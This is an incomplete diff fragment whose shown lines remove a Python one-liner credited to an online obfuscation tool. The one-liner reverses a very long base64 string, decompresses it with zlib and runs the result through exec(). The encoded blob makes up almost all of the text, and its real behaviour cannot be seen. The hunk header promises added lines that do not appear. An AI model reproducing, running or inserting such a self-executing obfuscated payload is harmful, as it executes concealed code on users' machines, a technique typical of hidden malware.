@@ -1,4 +1,550 @@
-
-# Python obfuscation by freecodingtools.org
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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